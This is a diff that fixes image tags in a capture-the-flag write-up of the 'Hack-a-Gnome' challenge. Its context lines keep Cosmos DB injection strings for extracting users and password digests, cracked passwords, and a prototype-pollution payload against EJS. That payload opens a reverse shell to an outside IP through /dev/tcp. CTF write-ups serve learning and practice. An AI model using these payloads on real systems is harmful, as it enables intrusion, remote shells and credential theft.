@@ -88,7 +88,7 @@ Structure Query Language (SQL) injection was used to identify the database type,
 
 Starting with the login page, tested several injections attempting to identify the backend database. This nosql injection {“$ne”: null} creates an error:
 
-!<img src="/HHC_2025/images/hack-a-gnome_dberror.jpg" alt="Hack-a-Gnome Database Error">
+<img src="/HHC_2025/images/hack-a-gnome_dberror.jpg" alt="Hack-a-Gnome Database Error">
 
 The error message indicates the application is using Azure Cosmos DB!
 
@@ -130,7 +130,7 @@ About Cosmos DB:
 
 Using the register functionality, it is possible to search for users using the syntax '" OR STARTWITH(c.username, "b") by observing the system response. If username starts with the string, the error message is "Username is taken". If it doesnt startwith the string, then the message is "Username is available". This pattern can be used to identify two users: bruce and harold.
 
-!<img src="/HHC_2025/images/hack-a-gnome_user_identification.jpg" alt="Hack-a-Gnome User Identification">
+<img src="/HHC_2025/images/hack-a-gnome_user_identification.jpg" alt="Hack-a-Gnome User Identification">
 
 Using similar injection techniques, it is possible to map the database structure.
 
@@ -144,13 +144,13 @@ Using similar injection techniques, it is possible to map the database structure
 
 Using trial and error, the length of the digest can be determined using the injection: 'harold" AND Length(c.digest) = 32--'
 
-!<img src="/HHC_2025/images/hack-a-gnome_digest_length.jpg" alt="Hack-a-Gnome Password Digest Length">
+<img src="/HHC_2025/images/hack-a-gnome_digest_length.jpg" alt="Hack-a-Gnome Password Digest Length">
 
 The digest can only consist of a limited number of characters: 0-9 and a-f.
 
 Using the injection 'harold" AND STARTSWITH(c.digest) = "0"', it is possible to retrieve both digests.
 
-!<img src="/HHC_2025/images/hack-a-gnome_digest.jpg" alt="Hack-a-Gnome Password Digest">
+<img src="/HHC_2025/images/hack-a-gnome_digest.jpg" alt="Hack-a-Gnome Password Digest">
 
 Bruce digest: d0a9ba00f80cbc56584ef245ffc56b9e
 
@@ -158,7 +158,7 @@ Harold digest: 07f456ae6a94cb68d740df548847f459
 
 Usiong crackstation.net, it is possible to crack both hashes.
 
-!<img src="/HHC_2025/images/hack-a-gnome_digest_crack.jpg" alt="Hack-a-Gnome Password Digest Crack">
+<img src="/HHC_2025/images/hack-a-gnome_digest_crack.jpg" alt="Hack-a-Gnome Password Digest Crack">
 
 Bruce password: oatmeal12
 
@@ -168,7 +168,7 @@ Once logged in we are presented with the Smart Gnome Control Center as Bruce:
 
 The hint indicates that we should be attempting prototype pollution of the statistics panel.
 
-!<img src="/HHC_2025/images/hack-a-gnome_statistics_panel.jpg" alt="Hack-a-Gnome Password Statistics Panel">
+<img src="/HHC_2025/images/hack-a-gnome_statistics_panel.jpg" alt="Hack-a-Gnome Password Statistics Panel">
 
 The following reference is helpful for understanding prototye polution: https://www.youtube.com/watch?v=W9_x8pc_bh8
 
@@ -184,11 +184,11 @@ Message: message=%7B%22action%22%3A%22update%22%2C%22key%22%3A%22__proto__%22%2C
 
 Sending via Burp:
 
-!<img src="/HHC_2025/images/hack-a-gnome_prototypepollution.jpg" alt="Hack-a-Gnome PrototypePollution">
+<img src="/HHC_2025/images/hack-a-gnome_prototypepollution.jpg" alt="Hack-a-Gnome PrototypePollution">
 
 Results in a broken application:
 
-!<img src="/HHC_2025/images/hack-a-gnome_prototypepollutionsuccess.jpg" alt="Hack-a-Gnome PrototypePollutionSuccess">
+<img src="/HHC_2025/images/hack-a-gnome_prototypepollutionsuccess.jpg" alt="Hack-a-Gnome PrototypePollutionSuccess">
 
 Prototype pollution is possible. Server Headers indicate “Express” which is Node.js. The hint indicates that there are backend templates. Googling "what is the most common template package used with Node.js" indicates that EJS is the most popular package. EJS is also be susceptible to RCE using prototype pollution.
 
@@ -217,7 +217,7 @@ message=%7B%22action%22%3A%22update%22%2C%22key%22%3A%22__proto__%22%2C%22subkey
 
 Webhook detects the connection:
 
-!<img src="/HHC_2025/images/hack-a-gnome_webhookconnection.jpg" alt="Hack-a-Gnome Webhook Connection">
+<img src="/HHC_2025/images/hack-a-gnome_webhookconnection.jpg" alt="Hack-a-Gnome Webhook Connection">
 
 Weaponizing with Node.JS reverse shell:
 <br>
@@ -238,7 +238,7 @@ The message payload for the shell:
 message=%7B%22action%22%3A%22update%22%2C%22key%22%3A%22__proto__%22%2C%22subkey%22%3A%22outputFunctionName%22%2C%22value%22%3A%22x%3Bprocess.mainModule.require('child_process').execSync('bash%20-c%20%5C%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F173.255.237.30%2F4444%200%3E%261%5C%22')%3Bs%22%7D
 </code></pre>
 
-!<img src="/HHC_2025/images/hack-a-gnome_reverseshell.jpg" alt="Hack-a-Gnome Reverse Shell">
+<img src="/HHC_2025/images/hack-a-gnome_reverseshell.jpg" alt="Hack-a-Gnome Reverse Shell">
 
 Once the payload is sent, trigger a refresh in the application to load the payload (change name + refresh).
 
@@ -271,7 +271,7 @@ Trial and error reveals the codes:
 
 With control of the robot, boxes need to be moved so the power switch can be reached. The robot can only move a single box, so that limits the path.
 
-!<img src="/HHC_2025/images/hack-a-gnome_solution.jpg" alt="Hack-a-Gnome Solution">
+<img src="/HHC_2025/images/hack-a-gnome_solution.jpg" alt="Hack-a-Gnome Solution">
 
 <strong>Answer: Reach the power switch and shut down the factory</strong>
 
